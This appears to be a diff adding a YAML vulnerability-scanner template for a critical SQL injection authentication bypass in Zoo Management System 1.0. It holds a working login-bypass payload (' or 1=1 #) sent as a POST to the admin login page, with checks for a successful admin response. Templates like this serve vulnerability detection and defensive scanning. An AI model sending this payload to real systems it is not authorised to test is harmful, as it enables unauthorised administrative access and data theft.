@@ -1,0 +1,33 @@
+id: zms-auth-bypass
+brief:
+    title: Zoo Management System 1.0 - SQL Injection
+    by: dwisiswant0
+    level: critical
+    about: Zoo Management System 1.0 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operati...
+    label:
+        - edb
+        - auth-bypass
+        - packetstorm
+        - zms
+        - sqli
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/zms/admin/index.php'
+      head:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: PHPSESSID={{randstr}}
+        Origin: '{{BaseURL}}'
+        Referer: '{{BaseURL}}/zms/admin/index.php'
+      body: username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=
+      signs:
+        - "on": word
+          has:
+            - ZMS ADMIN
+          in: body
+        - "on": status
+          status:
+            - 200
